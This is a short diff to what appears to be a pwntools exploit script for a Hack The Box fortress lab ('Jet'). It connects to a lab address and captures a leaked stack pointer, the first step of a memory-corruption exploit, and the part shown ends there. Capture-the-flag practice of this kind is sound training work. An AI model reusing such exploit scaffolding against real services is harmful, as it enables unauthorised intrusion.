@@ -1,3 +1,4 @@
+#created for htb fortress jet labs
 from pwn import * # https://docs.pwntools.com/en/stable/about.html
 tango=remote('10.13.37.10',65432) #connection
 tango.recvuntil("Oops, I'm leaking! ") #collect leak like % --> "Oops, I'm leaking! 0x7ffed4437110" ref https://docs.pwntools.com/en/stable/tubes.html#pwnlib.tubes.tube.tube.recvuntil
